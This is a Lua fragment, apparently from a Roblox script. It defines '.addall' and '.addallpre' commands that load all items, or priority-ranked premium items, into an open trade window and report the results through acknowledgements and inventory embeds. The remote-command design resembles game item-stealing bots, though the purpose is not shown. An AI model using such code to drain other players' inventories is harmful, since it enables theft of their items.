local function cmdAddAll()
    if not tradeWindowOpen() then
        sendAck("trade window not open")
        return
    end
    clearTradeItems()
    task.wait(0.3)
    local items = collectTradeable()
    if #items == 0 then
        sendAck("inventory empty")
        sendInventoryEmbed("addall — inventory empty")
        return
    end
    local added = 0
    local cap = math.min(MAX_ITEMS_PER_TRADE, #items)
    for i = 1, cap do
        addToTrade(items[i].Name)
        added = added + 1
        task.wait(0.2)
    end
    sendAck("added " .. added .. " items")
    sendInventoryEmbed("Command: .addall — added " .. added)
end

local function cmdAddAllPre()
    if not tradeWindowOpen() then sendAck("trade window not open"); return end
    clearTradeItems()
    task.wait(0.3)
    local inv = getInventory()
    local prems = {}
    for _, v in ipairs(inv) do
        if classify(v) == "premium" then prems[#prems + 1] = v end
    end
    table.sort(prems, function(a, b) return priorityRank(a) < priorityRank(b) end)
    local added = 0
    for i = 1, math.min(MAX_ITEMS_PER_TRADE, #prems) do
        addToTrade(prems[i].Name)
        added = added + 1
        task.wait(0.2)
    end
    sendAck("added " .. added .. " premiums")
    sendInventoryEmbed("Command: .addallpre — added " .. added)
end

